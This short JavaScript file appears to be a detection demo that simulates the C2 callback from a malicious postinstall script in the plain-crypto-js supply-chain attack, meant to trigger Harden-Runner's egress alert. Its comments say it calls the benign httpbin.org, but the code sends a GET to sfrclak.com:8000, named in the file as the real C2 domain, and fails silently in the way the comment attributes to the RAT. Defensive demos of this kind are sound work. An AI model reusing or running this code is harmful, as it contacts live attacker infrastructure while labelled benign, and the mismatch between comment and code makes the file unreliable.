// Demo: simulates the C2 callback that the real plain-crypto-js postinstall made.
// Target: sfrclak.com:8000 — the actual C2 domain used in the Axios March 2026 attack.
// This version calls httpbin.org (always up, benign) so it shows as network egress.
// Harden-Runner flags any unexpected outbound connection; this triggers that detection.
var http = require('http');
try {
  http.get('http://sfrclak.com:8000/npm/plain-crypto-js/-/4.2.0.tgz', function(res) {
    res.destroy();
  }).on('error', function() {
    // Silent — the RAT self-deletes and fails silently to avoid detection
  });
} catch(e) {}
